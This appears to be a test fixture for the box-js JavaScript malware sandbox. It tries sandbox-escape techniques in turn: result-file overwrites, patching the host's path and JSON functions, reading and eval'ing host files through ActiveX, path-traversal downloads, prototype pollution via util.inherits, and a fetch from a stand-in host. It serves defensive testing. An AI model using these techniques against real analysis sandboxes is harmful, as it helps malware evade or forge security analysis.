// Prefixed with escape-helpers.js by test/sandbox-escape.js. Capabilities handed out through
// require() and the emulation, rather than reachability: each step tries to make the host
// act for the sample, and the test checks the effect from outside.
var LEAK = MARK + ".leak.js";

attempt("module-shapes", function () {
  // node's events module IS the EventEmitter; samples use it that way.
  var E = require("events");
  var got = [];
  try { var e = new E(); e.on("x", function (v) { got.push(v); }); e.emit("x", "ctor"); } catch (err) {}
  try {
    var X = function () { E.call(this); };
    require("util").inherits(X, E);
    var x = new X(); x.once("y", function (v) { got.push(v); }); x.emit("y", "inherits"); x.emit("y", "twice");
  } catch (err) {}
  try { var z = new E.EventEmitter(); z.on("z", function (v) { got.push(v); }); z.emit("z", "named"); } catch (err) {}
  if (got.join(",") === "ctor,inherits,named") url("http://attempted.example/events-work");
  try {
    var src = new E(), seen = [];
    src.on("removeListener", function (n) { seen.push("removed-" + n); });
    var h = function () {};
    src.on("x", h);
    src.removeListener("x", h);
    (async function () {
      for await (const [v] of E.on(src, "payload")) { seen.push(v); break; }
      if (seen.slice(0, 2).join(",") === "removed-x,p1") url("http://attempted.example/events-iterator");
    })();
    src.emit("payload", "p1");
  } catch (err) {}
  try {
    var em = new E();
    E.once(em, "ready").then(function () {
      // node removes its temporary "error" listener once the event fires.
      if (em.listenerCount("error") === 0) url("http://attempted.example/events-once-clean");
    });
    em.emit("ready");
  } catch (err) {}
  try {
    var zl = require("zlib");
    var round = zl.inflateSync(zl.deflateSync(Buffer.from("zlib-roundtrip"))).toString();
    if (round === "zlib-roundtrip") url("http://attempted.example/zlib-works");
    zl.gunzip(zl.gzipSync("zlib-callback"), function (e, buf) {
      if (!e && String(buf) === "zlib-callback") url("http://attempted.example/zlib-callback-works");
    });
  } catch (err) {}
  try {
    if (typeof E.getEventListeners === "function" && typeof E.setMaxListeners === "function" &&
        typeof E.once === "function" && E.defaultMaxListeners === 10) url("http://attempted.example/events-statics");
  } catch (err) {}
  // The host module carries members the sandbox's own EventEmitter does not.
  try { if (typeof E.init === "function" || typeof E.usingDomains === "boolean") hit("events-host-module"); } catch (err) {}
});
attempt("argv-flags", function () {
  // The sandbox's argv is a frozen copy: flipping it must not change what the host does.
  var already = false;
  try { already = require("./argv.js").run["fake-download"] === true; } catch (err) {}
  if (already) return; // the run really has --fake-download
  try { require("./argv.js").run["fake-download"] = true; } catch (err) {}
  try {
    var x = new ActiveXObject("MSXML2.XMLHTTP");
    x.open("GET", "http://attempted.example/argv-fetch", false);
    x.send();
    if (String(x.responseText).indexOf("EXECUTED DOWNLOADED PAYLOAD") >= 0) hit("argv-fake-download");
  } catch (err) {}
});
attempt("result-name-overwrite", function () {
  // box-js saves atob() output as <sha256>.bin and <a download> saves as <sha256>_<name>;
  // the sample can compute both names, before and after box-js writes them.
  try {
    var h = require("crypto").createHash("sha256").update("probe-payload").digest("hex");
    lib.logResource(h + ".bin", "C:\\claimed-before", "claimed-by-sample");
    lib.logSnippet(h + ".bin", {as: "claimed-by-sample"}, "x");
    atob("cHJvYmUtcGF5bG9hZA==");
    lib.logResource(h + ".bin", "C:\\x", "overwritten-by-sample");
    lib.logResource(h + "_invoice.exe", "C:\\x", "overwritten-by-sample");
  } catch (err) {}
});
attempt("path-self-reference", function () {
  // If any of these is the host's real path module, lib's next results-file write lands on
  // the sample's chosen path.
  var p = require("path");
  var chain = [p, p.posix, p.win32, p.posix.posix, p.posix.win32, p.win32.win32, p.win32.posix];
  chain.forEach(function (o) {
    try { o.join = function () { return MARK + ".path-join"; }; } catch (err) {}
    try { o.resolve = function () { return MARK + ".path-resolve"; }; } catch (err) {}
  });
  try { lib.logResource("probe-resource", "C:\\probe.txt", "x"); } catch (err) {}
  try { lib.logSnippet("probe-snippet.js", {as: "probe"}, "x"); } catch (err) {}
});
attempt("real-file-read", function () {
  // __MARK__.leak.js is a real host file; its contents call hit() if they ever come back.
  try { var c = lib.readFile(LEAK); if (typeof c === "string" && c.length) eval(c); } catch (err) {}
  try {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var t = fso.OpenTextFile(LEAK, 1).ReadAll();
    if (typeof t === "string" && t.length) eval(t);
  } catch (err) {}
  try {
    var st = new ActiveXObject("ADODB.Stream"); st.Open(); st.Type = 2; st.LoadFromFile(LEAK);
    var u = st.ReadText(); if (typeof u === "string" && u.length) eval(u);
  } catch (err) {}
});
attempt("download-attribute", function () {
  // With --fake-download an <a download> click saves the last atob() output; the sample
  // must choose neither which file is read nor where it is written.
  try { atob("cHJvYmU="); } catch (err) {}
  try { lastDecodedFile = LEAK; } catch (err) {}
  // self/global are the host's sandbox object, which the handler used to read this from.
  try { self.lastDecodedFile = LEAK; } catch (err) {}
  try { global.lastDecodedFile = LEAK; } catch (err) {}
  try {
    var a = document.createElement("a");
    a.download = "/../../" + MARK.split("/").pop() + ".download-traversal";
    a.click();
  } catch (err) {}
});
url("http://attempted.example/done");
attempt("prototype-splice", function () {
  // Last: if util.inherits runs host-side, host Array.prototype gains this toJSON and the
  // host's own urls.json is the sample's.
  function G() {}
  G.prototype.toJSON = function () { return ["http://escaped.example/prototype-splice"]; };
  try { require("util").inherits(Array, G); } catch (err) {}
  try { require("util").inherits(Error, G); } catch (err) {}
  url("http://attempted.example/after-splice");
});
attempt("json-intrinsic", function () {
  // The sandbox's JSON must be its own: box-js writes every results file with the host's.
  try { JSON.stringify = function () { return "[\"http://escaped.example/json-forged\"]"; }; } catch (err) {}
  url("http://attempted.example/after-json");
});
